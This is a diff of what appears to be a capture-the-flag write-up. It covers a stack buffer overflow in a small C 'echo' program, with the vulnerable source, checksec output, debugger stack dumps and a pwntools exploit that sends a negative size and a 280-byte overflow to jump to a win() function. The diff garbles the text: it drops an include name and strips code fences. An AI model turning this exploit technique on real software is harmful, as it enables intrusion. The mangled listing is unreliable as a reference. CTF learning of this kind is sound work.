@@ -5,11 +5,11 @@
 
 
 ```
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
 
-#define BUF_SIZE 0x100
+    #define BUF_SIZE 0x100
 
 /* Call this function! */
 void win() {
@@ -67,21 +67,11 @@ int main() {
  echo();
  return 0;
 }
-```
-
-
-
-```
 Arch: amd64-64-little
  RELRO: Partial RELRO
  Stack: No canary found
  NX: NX enabled
  PIE: No PIE (0x400000)
-```
-
-
-
-```
 int get_size() {
  // Input size
  int size = 0;
@@ -95,31 +85,16 @@ int get_size() {
 
  return size;
 }
-```
-
-
-
-```
 0272| 0x7fffffffdca0 --> 0x7fffffffdcb0 --> 0x1
 0280| 0x7fffffffdca8 --> 0x4013d4 (<main+58>: mov eax,0x0)
 0288| 0x7fffffffdcb0 --> 0x1
-```
-
-
-
-```
 0000| 0x7fffffffdb90 --> 0x4141414141 ('AAAAA')
-```
-
-
-
-```
 from pwn import *
 
 win = ELF("./echo").symbols["win"]
 
 p = process('./echo')
-#p = remote("[redacted]", [redacted])
+    #p = remote("[redacted]", [redacted])
 
 p.sendlineafter(b"Size: ", b"-2147483648")
 p.sendlineafter(b"Data: ", b'A' * 280 + p32(win))
